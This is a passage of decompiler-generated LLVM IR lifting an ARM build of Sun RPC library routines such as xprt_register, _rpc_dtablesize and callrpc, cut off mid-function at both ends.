  %v2_2e4e4 = icmp eq i16 %v3_2e4e0, 0
  br i1 %v2_2e4e4, label %dec_label_pc_2e514, label %dec_label_pc_2e4ec

dec_label_pc_2e4ec:                               ; preds = %dec_label_pc_2e4e0
  %v1_2e4ec = and i16 %v3_2e4e0, 32
  %v2_2e4ec = icmp eq i16 %v1_2e4ec, 0
  %v0_2e4f4 = load i32, i32* @r6, align 4
  %v1_2e4f4 = add i32 %v0_2e4f4, 1
  store i32 %v1_2e4f4, i32* @r6, align 4
  br i1 %v2_2e4ec, label %dec_label_pc_2e510, label %dec_label_pc_2e4fc

dec_label_pc_2e4fc:                               ; preds = %dec_label_pc_2e4ec
  %v0_2e4fc = call i32 @__rpc_thread_variables()
  %v1_2e500 = add i32 %v0_2e4fc, 180
  %v2_2e500 = inttoptr i32 %v1_2e500 to i32*
  %v3_2e500 = load i32, i32* %v2_2e500, align 4
  %v1_2e504 = load i32, i32* @r4, align 4
  %v4_2e504 = mul i32 %v1_2e504, 4
  %v5_2e504 = add i32 %v4_2e504, %v3_2e500
  %v6_2e504 = inttoptr i32 %v5_2e504 to i32*
  %v7_2e504 = load i32, i32* %v6_2e504, align 4
  %v1_2e508 = inttoptr i32 %v7_2e504 to i32*
  %v2_2e508 = call i32 @xprt_unregister(i32* %v1_2e508)
  br label %dec_label_pc_2e514

dec_label_pc_2e510:                               ; preds = %dec_label_pc_2e4ec
  %v1_2e510 = call i32 @svc_getreq_common(i32 %v4_2e4d0)
  br label %dec_label_pc_2e514

dec_label_pc_2e514:                               ; preds = %dec_label_pc_2e4e0, %dec_label_pc_2e4d0, %dec_label_pc_2e4fc, %dec_label_pc_2e510
  %v0_2e514 = load i32, i32* @r5, align 4
  %v1_2e514 = add i32 %v0_2e514, 1
  br label %dec_label_pc_2e518

dec_label_pc_2e518:                               ; preds = %entry, %dec_label_pc_2e514
  %storemerge = phi i32 [ 0, %entry ], [ %v1_2e514, %dec_label_pc_2e514 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_2e518 = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_2e51c = inttoptr i32 %v0_2e518 to i32*
  %v2_2e51c = load i32, i32* %v1_2e51c, align 4
  %v0_2e520 = load i32, i32* @r5, align 4
  %v2_2e520 = sub i32 %v0_2e520, %v2_2e51c
  %v4_2e520 = xor i32 %v0_2e520, %v2_2e51c
  %v5_2e520 = xor i32 %v2_2e520, %v0_2e520
  %v6_2e520 = and i32 %v5_2e520, %v4_2e520
  %v5_2e524 = icmp slt i32 %v0_2e520, %v2_2e51c
  br i1 %v5_2e524, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_2e518
  %v6_2e524 = load i32, i32* @r6, align 4
  %v7_2e524 = load i32, i32* @r8, align 4
  %v8_2e524 = sub i32 %v6_2e524, %v7_2e524
  %v10_2e524 = xor i32 %v7_2e524, %v6_2e524
  %v11_2e524 = xor i32 %v8_2e524, %v6_2e524
  %v12_2e524 = and i32 %v11_2e524, %v10_2e524
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_2e518, %bb
  %v1_2e52c.in = phi i32 [ %v6_2e520, %dec_label_pc_2e518 ], [ %v12_2e524, %bb ]
  %v0_2e52c.in = phi i32 [ %v2_2e520, %dec_label_pc_2e518 ], [ %v8_2e524, %bb ]
  %v0_2e52c = icmp slt i32 %v0_2e52c.in, 0
  %v1_2e52c = icmp slt i32 %v1_2e52c.in, 0
  %v2_2e52c = xor i1 %v1_2e52c, %v0_2e52c
  br i1 %v2_2e52c, label %dec_label_pc_2e4d0, label %dec_label_pc_2e530

dec_label_pc_2e530:                               ; preds = %bb9
  ret i32 %v0_2e518

; uselistorder directives
  uselistorder i32 %v0_2e520, { 3, 1, 2, 4, 0 }
  uselistorder i32 %v2_2e51c, { 1, 0, 2 }
  uselistorder i32 %v4_2e4d0, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_2e518, { 1, 0 }
  uselistorder label %dec_label_pc_2e514, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v0_2e544 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e544, i32* %r0.global-to-local, align 4
  %v1_2e548 = add i32 %v0_2e544, 180
  %v2_2e548 = inttoptr i32 %v1_2e548 to i32*
  %v3_2e548 = load i32, i32* %v2_2e548, align 4
  %v2_2e54c = icmp eq i32 %v3_2e548, 0
  store i32 %v0_2e544, i32* @r4, align 4
  %v0_2e554 = load i32, i32* @r5, align 4
  %v1_2e554 = inttoptr i32 %v0_2e554 to i32*
  %v2_2e554 = load i32, i32* %v1_2e554, align 4
  store i32 %v2_2e554, i32* @r7, align 4
  br i1 %v2_2e54c, label %dec_label_pc_2e55c, label %dec_label_pc_2e574

dec_label_pc_2e55c:                               ; preds = %entry
  %v0_2e55c = call i32 @_rpc_dtablesize()
  %v3_2e560 = mul i32 %v0_2e55c, 4
  store i32 %v3_2e560, i32* %r0.global-to-local, align 4
  %v1_2e564 = call i32 @malloc(i32 %v3_2e560)
  store i32 %v1_2e564, i32* %r0.global-to-local, align 4
  %v2_2e568 = icmp eq i32 %v1_2e564, 0
  %v1_2e56c = load i32, i32* @r4, align 4
  %v2_2e56c = add i32 %v1_2e56c, 180
  %v3_2e56c = inttoptr i32 %v2_2e56c to i32*
  store i32 %v1_2e564, i32* %v3_2e56c, align 4
  br i1 %v2_2e568, label %dec_label_pc_2e648, label %dec_label_pc_2e574

dec_label_pc_2e574:                               ; preds = %entry, %dec_label_pc_2e55c
  %v0_2e574 = call i32 @_rpc_dtablesize()
  store i32 %v0_2e574, i32* %r0.global-to-local, align 4
  %v0_2e578 = load i32, i32* @r7, align 4
  %v6_2e57c = icmp slt i32 %v0_2e578, %v0_2e574
  br i1 %v6_2e57c, label %dec_label_pc_2e580, label %dec_label_pc_2e648

dec_label_pc_2e580:                               ; preds = %dec_label_pc_2e574
  %v0_2e580 = load i32, i32* @r4, align 4
  %v1_2e580 = add i32 %v0_2e580, 180
  %v2_2e580 = inttoptr i32 %v1_2e580 to i32*
  %v3_2e580 = load i32, i32* %v2_2e580, align 4
  %v0_2e588 = load i32, i32* @r5, align 4
  %v5_2e588 = mul i32 %v0_2e578, 4
  %v6_2e588 = add i32 %v3_2e580, %v5_2e588
  %v7_2e588 = inttoptr i32 %v6_2e588 to i32*
  store i32 %v0_2e588, i32* %v7_2e588, align 4
  %v6_2e58c = icmp slt i32 %v0_2e578, 1024
  br i1 %v6_2e58c, label %dec_label_pc_2e590, label %dec_label_pc_2e5ec

dec_label_pc_2e590:                               ; preds = %dec_label_pc_2e580
  %v0_2e590 = load i32, i32* %r0.global-to-local, align 4
  %v1_2e590 = load i32, i32* @r1, align 4
  %v2_2e590 = load i32, i32* @r2, align 4
  %v4_2e590 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_2e590, i32 %v1_2e590, i32 %v2_2e590, i32 %v3_2e580)
  store i32 %v4_2e590, i32* %r0.global-to-local, align 4
  %v0_2e594 = load i32, i32* @r7, align 4
  %v3_2e594 = udiv i32 %v0_2e594, 32
  %v4_2e598 = mul nuw nsw i32 %v3_2e594, 4
  %v5_2e598 = add i32 %v4_2e598, %v4_2e590
  %v6_2e598 = inttoptr i32 %v5_2e598 to i32*
  %v7_2e598 = load i32, i32* %v6_2e598, align 4
  %v1_2e59c = urem i32 %v0_2e594, 32
  store i32 %v1_2e59c, i32* %r1.global-to-local, align 4
  %v7_2e5a4 = shl i32 1, %v1_2e59c
  %v8_2e5a4 = or i32 %v7_2e5a4, %v7_2e598
  store i32 %v8_2e5a4, i32* %v6_2e598, align 4
  br label %dec_label_pc_2e5ec

dec_label_pc_2e5b4:                               ; preds = %dec_label_pc_2e5ec
  %v0_2e5b4 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_2e5b4, i32* %r0.global-to-local, align 4
  %v1_2e5b8 = inttoptr i32 %v0_2e5b4 to i32*
  %v2_2e5b8 = load i32, i32* %v1_2e5b8, align 4
  %v1_2e5bc = load i32, i32* @r5, align 4
  %v4_2e5bc = mul i32 %v1_2e5bc, 8
  %v5_2e5bc = add i32 %v4_2e5bc, %v2_2e5b8
  %v6_2e5bc = inttoptr i32 %v5_2e5bc to i32*
  %v7_2e5bc = load i32, i32* %v6_2e5bc, align 4
  %v3_2e5c0 = icmp eq i32 %v7_2e5bc, -1
  store i32 %v0_2e5b4, i32* %r1.global-to-local, align 4
  %v3_2e5c8 = mul i32 %v1_2e5bc, 8
  store i32 %v3_2e5c8, i32* %r0.global-to-local, align 4
  %v1_2e5e8 = add i32 %v1_2e5bc, 1
  br i1 %v3_2e5c0, label %dec_label_pc_2e5d0, label %dec_label_pc_2e5ec

dec_label_pc_2e5d0:                               ; preds = %dec_label_pc_2e5b4
  %v0_2e5d0 = load i32, i32* @r7, align 4
  store i32 %v0_2e5d0, i32* %v6_2e5bc, align 4
  %v0_2e5d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_2e5d4 = inttoptr i32 %v0_2e5d4 to i32*
  %v2_2e5d4 = load i32, i32* %v1_2e5d4, align 4
  %v1_2e5dc = load i32, i32* %r0.global-to-local, align 4
  %v2_2e5dc = add i32 %v1_2e5dc, %v2_2e5d4
  %v3_2e5e0 = add i32 %v2_2e5dc, 4
  %v4_2e5e0 = inttoptr i32 %v3_2e5e0 to i16*
  store i16 195, i16* %v4_2e5e0, align 2
  br label %dec_label_pc_2e648

dec_label_pc_2e5ec:                               ; preds = %dec_label_pc_2e590, %dec_label_pc_2e580, %dec_label_pc_2e5b4
  %storemerge = phi i32 [ %v1_2e5e8, %dec_label_pc_2e5b4 ], [ 0, %dec_label_pc_2e580 ], [ 0, %dec_label_pc_2e590 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_2e5ec = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_2e5ec, i32* %r0.global-to-local, align 4
  %v1_2e5f0 = inttoptr i32 %v0_2e5ec to i32*
  %v2_2e5f0 = load i32, i32* %v1_2e5f0, align 4
  store i32 %v2_2e5f0, i32* @r4, align 4
  %v0_2e5f4 = load i32, i32* @r5, align 4
  store i32 %v0_2e5ec, i32* @r6, align 4
  %v5_2e5fc = icmp slt i32 %v0_2e5f4, %v2_2e5f0
  br i1 %v5_2e5fc, label %dec_label_pc_2e5b4, label %dec_label_pc_2e600

dec_label_pc_2e600:                               ; preds = %dec_label_pc_2e5ec
  %v1_2e600 = add i32 %v2_2e5f0, 1
  store i32 %v1_2e600, i32* @r4, align 4
  store i32 %v1_2e600, i32* %v1_2e5f0, align 4
  %v0_2e608 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_2e608, i32* %r0.global-to-local, align 4
  %v0_2e60c = load i32, i32* @r4, align 4
  %v3_2e60c = mul i32 %v0_2e60c, 8
  store i32 %v3_2e60c, i32* %r1.global-to-local, align 4
  store i32 %v0_2e608, i32* @r5, align 4
  %v1_2e614 = inttoptr i32 %v0_2e608 to i32*
  %v2_2e614 = load i32, i32* %v1_2e614, align 4
  store i32 %v2_2e614, i32* %r0.global-to-local, align 4
  %v2_2e618 = inttoptr i32 %v2_2e614 to i32*
  %v3_2e618 = call i32 @realloc(i32* %v2_2e618, i32 %v3_2e60c)
  store i32 %v3_2e618, i32* %r0.global-to-local, align 4
  %v2_2e61c = icmp eq i32 %v3_2e618, 0
  %v1_2e620 = load i32, i32* @r5, align 4
  %v2_2e620 = inttoptr i32 %v1_2e620 to i32*
  store i32 %v3_2e618, i32* %v2_2e620, align 4
  br i1 %v2_2e61c, label %dec_label_pc_2e648, label %dec_label_pc_2e628

dec_label_pc_2e628:                               ; preds = %dec_label_pc_2e600
  %v0_2e628 = load i32, i32* @r6, align 4
  %v1_2e628 = inttoptr i32 %v0_2e628 to i32*
  %v2_2e628 = load i32, i32* %v1_2e628, align 4
  %v0_2e62c = load i32, i32* %r0.global-to-local, align 4
  %v4_2e62c = mul i32 %v2_2e628, 8
  %v5_2e62c = add i32 %v0_2e62c, %v4_2e62c
  %v0_2e630 = load i32, i32* @r7, align 4
  %v2_2e630 = add i32 %v5_2e62c, -8
  %v3_2e630 = inttoptr i32 %v2_2e630 to i32*
  store i32 %v0_2e630, i32* %v3_2e630, align 4
  %v0_2e634 = load i32, i32* @r6, align 4
  %v1_2e634 = inttoptr i32 %v0_2e634 to i32*
  %v2_2e634 = load i32, i32* %v1_2e634, align 4
  %v0_2e638 = load i32, i32* @r5, align 4
  %v1_2e638 = inttoptr i32 %v0_2e638 to i32*
  %v2_2e638 = load i32, i32* %v1_2e638, align 4
  %v4_2e63c = mul i32 %v2_2e634, 8
  %v5_2e63c = add i32 %v2_2e638, %v4_2e63c
  %v3_2e644 = add i32 %v5_2e63c, -4
  %v4_2e644 = inttoptr i32 %v3_2e644 to i16*
  store i16 195, i16* %v4_2e644, align 2
  br label %dec_label_pc_2e648

dec_label_pc_2e648:                               ; preds = %dec_label_pc_2e574, %dec_label_pc_2e600, %dec_label_pc_2e55c, %dec_label_pc_2e5d0, %dec_label_pc_2e628
  %v1_2e650 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2e650

; uselistorder directives
  uselistorder i32 %v3_2e60c, { 1, 0 }
  uselistorder i32 %v0_2e608, { 1, 0, 2 }
  uselistorder i32 %v1_2e5bc, { 1, 0, 2 }
  uselistorder i32 %v1_2e59c, { 1, 0 }
  uselistorder i32 %v0_2e594, { 1, 0 }
  uselistorder i32 %v3_2e580, { 1, 0 }
  uselistorder i32 %v0_2e578, { 1, 0, 2 }
  uselistorder i32 %v3_2e560, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 13, 2, 3, 1, 6, 8, 4, 5, 7, 9, 10, 11, 14, 12, 15, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 2, 1, 0 }
  uselistorder i16 195, { 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder i32 180, { 4, 5, 6, 7, 8, 9, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_2e648, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_2e5ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2e574, { 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_2e654 = load i32, i32* @r4, align 4
  store i32 %v3_2e654, i32* %stack_var_-12, align 4
  store i32 55912, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r4.global-to-local, align 4
  %v4_2e664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 55912) to i32*), align 4
  %v2_2e668 = icmp eq i32 %v4_2e664, 0
  br i1 %v2_2e668, label %dec_label_pc_2e674, label %dec_label_pc_2e67c

dec_label_pc_2e674:                               ; preds = %entry
  %v0_2e674 = call i32 @getdtablesize()
  %v1_2e678 = load i32, i32* %r4.global-to-local, align 4
  %v2_2e678 = load i32, i32* %r5.global-to-local, align 4
  %v3_2e678 = add i32 %v2_2e678, %v1_2e678
  %v4_2e678 = inttoptr i32 %v3_2e678 to i32*
  store i32 %v0_2e674, i32* %v4_2e678, align 4
  %v0_2e67c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_2e67c.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_2e684.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2e67c

dec_label_pc_2e67c:                               ; preds = %entry, %dec_label_pc_2e674
  %v2_2e684 = phi i32 [ %v3_2e654, %entry ], [ %v2_2e684.pre, %dec_label_pc_2e674 ]
  %v1_2e67c = phi i32 [ 55912, %entry ], [ %v1_2e67c.pre, %dec_label_pc_2e674 ]
  %v0_2e67c = phi i32 [ ptrtoint (i32* @global_var_44990.1184 to i32), %entry ], [ %v0_2e67c.pre, %dec_label_pc_2e674 ]
  %v2_2e67c = add i32 %v0_2e67c, %v1_2e67c
  %v3_2e67c = inttoptr i32 %v2_2e67c to i32*
  %v4_2e67c = load i32, i32* %v3_2e67c, align 4
  store i32 %v2_2e684, i32* @r4, align 4
  ret i32 %v4_2e67c

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @getdtablesize, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_2e67c, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_2e694 = load i32, i32* @r4, align 4
  store i32 %v3_2e694, i32* %stack_var_-8, align 4
  %v6_2e694 = load i32, i32* @lr, align 4
  %v0_2e698 = call i32 @__rpc_thread_variables()
  %v1_2e69c = add i32 %v0_2e698, 164
  %v2_2e69c = inttoptr i32 %v1_2e69c to i32*
  %v3_2e69c = load i32, i32* %v2_2e69c, align 4
  store i32 %v3_2e69c, i32* @r4, align 4
  %v2_2e6a0 = icmp eq i32 %v3_2e69c, 0
  br i1 %v2_2e6a0, label %dec_label_pc_2e6cc, label %dec_label_pc_2e6a8

dec_label_pc_2e6a8:                               ; preds = %entry
  %v1_2e6a8 = inttoptr i32 %v3_2e69c to i32*
  %v2_2e6a8 = load i32, i32* %v1_2e6a8, align 4
  %v2_2e6ac = icmp eq i32 %v2_2e6a8, 0
  br i1 %v2_2e6ac, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_2e6a8
  %v2_2e6b4 = add i32 %v2_2e6a8, 4
  %v3_2e6b4 = inttoptr i32 %v2_2e6b4 to i32*
  %v4_2e6b4 = load i32, i32* %v3_2e6b4, align 4
  %v2_2e6b8 = add i32 %v4_2e6b4, 16
  %v3_2e6b8 = inttoptr i32 %v2_2e6b8 to i32*
  %v4_2e6b8 = load i32, i32* %v3_2e6b8, align 4
  store i32 190148, i32* @lr, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2e6a8, %bb
  %.03 = phi i32 [ %v4_2e6b8, %bb ], [ undef, %dec_label_pc_2e6a8 ]
  %v2_2e6c0 = xor i1 %v2_2e6ac, true
  call void @__pseudo_cond_branch(i1 %v2_2e6c0, i32 %.03)
  %v0_2e6c4 = load i32, i32* @r4, align 4
  store i32 %v0_2e6c4, i32* @r0, align 4
  %v0_2e6c8 = call i32 @free()
  br label %dec_label_pc_2e6cc

dec_label_pc_2e6cc:                               ; preds = %entry, %.thread2
  %v1_2e6d0 = phi i32 [ %v0_2e698, %entry ], [ %v0_2e6c8, %.thread2 ]
  %v2_2e6cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2e6cc, i32* @r4, align 4
  store i32 %v6_2e694, i32* @lr, align 4
  ret i32 %v1_2e6d0

; uselistorder directives
  uselistorder label %dec_label_pc_2e6cc, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-1160 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_2e6d8 = load i32, i32* @r4, align 4
  %v12_2e6d8 = load i32, i32* @r7, align 4
  store i32 190176, i32* %stack_var_-4, align 4
  %v2_2e6dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_2e6dc, i32* @fp, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  %v0_2e6f4 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e6f4, i32* %r0.global-to-local, align 4
  %v1_2e6f8 = add i32 %v0_2e6f4, 164
  %v2_2e6f8 = inttoptr i32 %v1_2e6f8 to i32*
  %v3_2e6f8 = load i32, i32* %v2_2e6f8, align 4
  store i32 %v3_2e6f8, i32* @r6, align 4
  %v2_2e6fc = icmp eq i32 %v3_2e6f8, 0
  store i32 %v0_2e6f4, i32* @r4, align 4
  br i1 %v2_2e6fc, label %dec_label_pc_2e708, label %dec_label_pc_2e728

dec_label_pc_2e708:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_2e710 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_2e710, i32* %r0.global-to-local, align 4
  %v2_2e714 = icmp eq i32 %v2_2e710, 0
  br i1 %v2_2e714, label %bb, label %dec_label_pc_2e720

bb:                                               ; preds = %dec_label_pc_2e708
  %v1_2e718 = load i32, i32* @r6, align 4
  store i32 %v1_2e718, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e948

dec_label_pc_2e720:                               ; preds = %dec_label_pc_2e708
  %v1_2e720 = load i32, i32* @r4, align 4
  %v2_2e720 = add i32 %v1_2e720, 164
  %v3_2e720 = inttoptr i32 %v2_2e720 to i32*
  store i32 %v2_2e710, i32* %v3_2e720, align 4
  %v0_2e724 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2e724, i32* @r6, align 4
  br label %dec_label_pc_2e728

dec_label_pc_2e728:                               ; preds = %entry, %dec_label_pc_2e720
  %v0_2e728 = phi i32 [ %v3_2e6f8, %entry ], [ %v0_2e724, %dec_label_pc_2e720 ]
  %v1_2e728 = add i32 %v0_2e728, 20
  %v2_2e728 = inttoptr i32 %v1_2e728 to i32*
  %v3_2e728 = load i32, i32* %v2_2e728, align 4
  store i32 %v3_2e728, i32* @r4, align 4
  %v2_2e72c = icmp eq i32 %v3_2e728, 0
  br i1 %v2_2e72c, label %dec_label_pc_2e734, label %dec_label_pc_2e74c

dec_label_pc_2e734:                               ; preds = %dec_label_pc_2e728
  store i32 256, i32* %r0.global-to-local, align 4
  %v1_2e738 = call i32 @malloc(i32 256)
  %v2_2e738 = inttoptr i32 %v1_2e738 to i8*
  store i32 %v1_2e738, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_2e740 = load i32, i32* @r6, align 4
  %v3_2e740 = add i32 %v2_2e740, 20
  %v4_2e740 = inttoptr i32 %v3_2e740 to i32*
  store i32 %v1_2e738, i32* %v4_2e740, align 4
  %v0_2e744 = load i32, i32* @r4, align 4
  %v1_2e744 = trunc i32 %v0_2e744 to i8
  store i8 %v1_2e744, i8* %v2_2e738, align 1
  %v0_2e748 = load i32, i32* %r3.global-to-local, align 4
  %v1_2e748 = load i32, i32* @r6, align 4
  %v2_2e748 = add i32 %v1_2e748, 4
  %v3_2e748 = inttoptr i32 %v2_2e748 to i32*
  store i32 %v0_2e748, i32* %v3_2e748, align 4
  %v0_2e74c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2e74c

dec_label_pc_2e74c:                               ; preds = %dec_label_pc_2e728, %dec_label_pc_2e734
  %v0_2e770 = phi i32 [ %v0_2e728, %dec_label_pc_2e728 ], [ %v0_2e74c.pre, %dec_label_pc_2e734 ]
  %v1_2e74c = add i32 %v0_2e770, 16
  %v2_2e74c = inttoptr i32 %v1_2e74c to i32*
  %v3_2e74c = load i32, i32* %v2_2e74c, align 4
  store i32 %v3_2e74c, i32* %r3.global-to-local, align 4
  %v2_2e750 = icmp eq i32 %v3_2e74c, 0
  br i1 %v2_2e750, label %dec_label_pc_2e784, label %dec_label_pc_2e758

dec_label_pc_2e758:                               ; preds = %dec_label_pc_2e74c
  %v1_2e758 = add i32 %v0_2e770, 8
  %v2_2e758 = inttoptr i32 %v1_2e758 to i32*
  %v3_2e758 = load i32, i32* %v2_2e758, align 4
  store i32 %v3_2e758, i32* %r3.global-to-local, align 4
  %v1_2e75c = load i32, i32* @r7, align 4
  %v9_2e75c = icmp eq i32 %v3_2e758, %v1_2e75c
  br i1 %v9_2e75c, label %dec_label_pc_2e764, label %dec_label_pc_2e784

dec_label_pc_2e764:                               ; preds = %dec_label_pc_2e758
  %v1_2e764 = add i32 %v0_2e770, 12
  %v2_2e764 = inttoptr i32 %v1_2e764 to i32*
  %v3_2e764 = load i32, i32* %v2_2e764, align 4
  store i32 %v3_2e764, i32* %r3.global-to-local, align 4
  %v1_2e768 = load i32, i32* @r8, align 4
  %v9_2e768 = icmp eq i32 %v3_2e764, %v1_2e768
  br i1 %v9_2e768, label %dec_label_pc_2e770, label %dec_label_pc_2e784

dec_label_pc_2e770:                               ; preds = %dec_label_pc_2e764
  %v1_2e770 = add i32 %v0_2e770, 20
  %v2_2e770 = inttoptr i32 %v1_2e770 to i32*
  %v3_2e770 = load i32, i32* %v2_2e770, align 4
  store i32 %v3_2e770, i32* %r0.global-to-local, align 4
  %v0_2e774 = load i32, i32* @sl, align 4
  store i32 %v0_2e774, i32* @r1, align 4
  %v2_2e778 = inttoptr i32 %v3_2e770 to i8*
  %v3_2e778 = call i32 @__GI_strcoll(i8* %v2_2e778, i32 %v0_2e774)
  store i32 %v3_2e778, i32* %r0.global-to-local, align 4
  %v2_2e77c = icmp eq i32 %v3_2e778, 0
  br i1 %v2_2e77c, label %dec_label_pc_2e8e8, label %dec_label_pc_2e770.dec_label_pc_2e784_crit_edge

dec_label_pc_2e770.dec_label_pc_2e784_crit_edge:  ; preds = %dec_label_pc_2e770
  %v0_2e784.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_2e784

dec_label_pc_2e784:                               ; preds = %dec_label_pc_2e770.dec_label_pc_2e784_crit_edge, %dec_label_pc_2e764, %dec_label_pc_2e758, %dec_label_pc_2e74c
  %v1_2e790 = phi i32 [ %v0_2e784.pre, %dec_label_pc_2e770.dec_label_pc_2e784_crit_edge ], [ %v0_2e770, %dec_label_pc_2e764 ], [ %v0_2e770, %dec_label_pc_2e758 ], [ %v0_2e770, %dec_label_pc_2e74c ]
  %v1_2e784 = add i32 %v1_2e790, 4
  %v2_2e784 = inttoptr i32 %v1_2e784 to i32*
  %v3_2e784 = load i32, i32* %v2_2e784, align 4
  store i32 %v3_2e784, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v7_2e78c = icmp eq i32 %v3_2e784, -1
  %v2_2e790 = add i32 %v1_2e790, 16
  %v3_2e790 = inttoptr i32 %v2_2e790 to i32*
  store i32 0, i32* %v3_2e790, align 4
  br i1 %v7_2e78c, label %dec_label_pc_2e7a4, label %dec_label_pc_2e798

dec_label_pc_2e798:                               ; preds = %dec_label_pc_2e784
  %v1_2e798 = call i32 @__GI_close(i32 %v3_2e784)
  store i32 %v1_2e798, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_2e7a0 = load i32, i32* @r6, align 4
  %v2_2e7a0 = add i32 %v1_2e7a0, 4
  %v3_2e7a0 = inttoptr i32 %v2_2e7a0 to i32*
  store i32 -1, i32* %v3_2e7a0, align 4
  br label %dec_label_pc_2e7a4

dec_label_pc_2e7a4:                               ; preds = %dec_label_pc_2e784, %dec_label_pc_2e798
  %v0_2e7a4 = load i32, i32* @r6, align 4
  %v1_2e7a4 = inttoptr i32 %v0_2e7a4 to i32*
  %v2_2e7a4 = load i32, i32* %v1_2e7a4, align 4
  store i32 %v2_2e7a4, i32* %r3.global-to-local, align 4
  %v2_2e7a8 = icmp eq i32 %v2_2e7a4, 0
  br i1 %v2_2e7a8, label %dec_label_pc_2e7c8, label %dec_label_pc_2e7b0

dec_label_pc_2e7b0:                               ; preds = %dec_label_pc_2e7a4
  store i32 %v2_2e7a4, i32* %r0.global-to-local, align 4
  %v1_2e7b4 = add i32 %v2_2e7a4, 4
  %v2_2e7b4 = inttoptr i32 %v1_2e7b4 to i32*
  %v3_2e7b4 = load i32, i32* %v2_2e7b4, align 4
  store i32 %v3_2e7b4, i32* %r3.global-to-local, align 4
  %v1_2e7b8 = add i32 %v3_2e7b4, 16
  %v2_2e7b8 = inttoptr i32 %v1_2e7b8 to i32*
  %v3_2e7b8 = load i32, i32* %v2_2e7b8, align 4
  store i32 190404, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_2e7b8)
  %v0_2e7c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_2e7c4 = load i32, i32* @r6, align 4
  %v2_2e7c4 = inttoptr i32 %v1_2e7c4 to i32*
  store i32 %v0_2e7c4, i32* %v2_2e7c4, align 4
  br label %dec_label_pc_2e7c8

dec_label_pc_2e7c8:                               ; preds = %dec_label_pc_2e7a4, %dec_label_pc_2e7b0
  %v2_2e7d0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_2e7d0, i32* %r3.global-to-local, align 4
  %v2_2e7d4 = ptrtoint i32* %stack_var_-52 to i32
